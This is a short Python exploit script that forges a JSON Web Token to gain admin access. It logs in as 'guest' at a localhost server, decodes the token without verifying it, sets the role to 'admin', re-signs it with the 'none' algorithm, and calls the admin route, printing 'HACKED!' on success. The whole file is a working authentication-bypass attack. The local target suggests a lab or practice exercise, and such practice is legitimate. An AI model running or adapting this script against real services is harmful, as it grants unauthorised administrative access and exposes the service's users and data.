import jwt
import requests
import json

# Get a valid JWT token from the server
login_url = "http://localhost:3000/login"
admin_url = "http://localhost:3000/admin"

# Login as a normal user
payload = {"username": "guest"}
headers = {"Content-Type": "application/json"}

response = requests.post(login_url, data=json.dumps(payload), headers=headers)
if response.status_code == 200:
    original_token = response.json().get("token")
    print("[+] Got valid JWT token:", original_token)
else:
    print("[-] Failed to get JWT token")
    exit()

# Decode the original JWT without verification
decoded = jwt.decode(original_token, options={"verify_signature": False})
print("[+] Decoded JWT:", decoded)

# Change role to admin
decoded["role"] = "admin"

# Create a new unsigned JWT with "none" algorithm
fake_token = jwt.encode(decoded, key=None, algorithm="none")

print("[+] Tampered JWT:", fake_token)

# Send the tampered JWT to access the admin route
headers = {"Authorization": f"Bearer {fake_token}"}
admin_response = requests.get(admin_url, headers=headers)

if admin_response.status_code == 200:
    print("[+] Access Granted:", admin_response.json())
    print("HACKED!")
else:
    print("[-] Access Denied:", admin_response.json())
